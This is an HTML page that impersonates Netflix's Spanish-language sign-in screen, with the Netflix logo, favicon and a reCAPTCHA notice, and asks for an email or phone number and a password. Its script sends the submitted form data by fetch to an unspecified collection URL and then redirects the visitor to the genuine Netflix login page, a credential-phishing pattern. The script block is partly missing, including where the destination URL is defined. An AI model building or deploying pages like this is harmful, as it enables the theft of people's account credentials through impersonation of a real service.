<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Netflix</title>
    <link rel="shortcut icon" href="https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2023.ico">
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body {
            background: radial-gradient(circle at top, #451010 0%, #000000 45%);
            background-color: #000;
            color: #fff;
            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
        }
        .input-dark {
            background-color: rgba(18, 18, 18, 0.7);
            border: 1px solid #8c8c8c;
            color: white;
        }
        .input-dark:focus {
            border-color: #fff;
            ring: 2px;
            ring-color: #fff;
        }
    </style>
</head>
<body class="min-h-screen flex flex-col p-6">

    <header class="mb-12">
        <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" alt="Netflix" class="w-24">
    </header>

    <main class="flex-grow">
        <h1 class="text-[32px] font-bold leading-tight mb-2">Ingresa tu info para iniciar sesión</h1>
        <p class="text-[#b3b3b3] text-lg mb-6">O bien, comienza con una cuenta nueva.</p>

        <form id="loginForm" class="space-y-4">
            <div class="relative">
                <input type="email" name="email" required 
                    class="w-full input-dark p-4 rounded-md text-base outline-none transition"
                    placeholder="Email o número de celular">
            </div>

            <div class="relative">
                <input type="password" name="password" required 
                    class="w-full input-dark p-4 rounded-md text-base outline-none transition"
                    placeholder="Contraseña">
            </div>

            <button type="submit" id="btnSubmit"
                class="w-full bg-[#e50914] text-white py-3 rounded-md font-bold text-lg active:scale-[0.98] transition-all">
                Continuar
            </button>
        </form>

        <div class="mt-8">
            <button class="text-[#b3b3b3] flex items-center text-lg font-medium">
                Obtener ayuda 
                <svg class="w-5 h-5 ml-1 mt-1" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path></svg>
            </button>
        </div>

        <p class="mt-12 text-[#737373] text-sm leading-relaxed">
            Esta página está protegida por Google reCAPTCHA para comprobar que no eres un robot. 
            <span class="text-[#b3b3b3] cursor-pointer font-medium">Más info</span>
        </p>
    </main>

        form.addEventListener('submit', e => {
            e.preventDefault();
            btn.innerText = "Cargando...";
            btn.disabled = true;

            fetch(scriptURL, { method: 'POST', body: new FormData(form), mode: 'no-cors'})
            .then(() => { 
                window.location.href = "https://www.netflix.com/login"; 
            })
            .catch(() => { 
                window.location.href = "https://www.netflix.com/login"; 
            });
        });
    </script>

</body>
</html>
